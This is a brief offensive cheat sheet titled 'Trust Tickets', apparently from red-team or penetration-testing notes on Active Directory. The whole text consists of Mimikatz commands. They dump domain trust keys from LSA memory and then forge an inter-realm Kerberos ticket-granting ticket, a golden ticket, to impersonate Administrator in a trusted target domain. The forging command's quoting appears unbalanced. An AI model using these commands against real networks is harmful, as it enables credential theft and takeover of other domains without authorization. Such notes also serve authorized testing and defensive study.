# Trust Tickets

### Dump Trust Key using MimiKatz

```
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```

### Forge an inter-realm TGT using the Golden Ticket attack

```
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:
<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
<PathToSaveTheGoldenTicket>"
```
